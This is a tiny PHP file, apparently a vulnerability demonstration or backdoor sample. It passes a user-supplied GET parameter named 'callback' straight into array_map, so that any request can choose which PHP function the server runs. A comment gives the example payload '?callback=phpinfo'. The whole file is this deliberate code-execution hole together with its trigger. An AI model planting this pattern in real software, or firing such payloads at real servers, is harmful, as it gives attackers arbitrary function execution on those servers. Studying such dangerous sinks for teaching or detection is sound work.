<?php
//payload=?callback=phpinfo
$evil_callback=$_GET['callback'];
$arr=array(0,1,2,3);
$new_arr=array_map($evil_callback,$arr);
?>
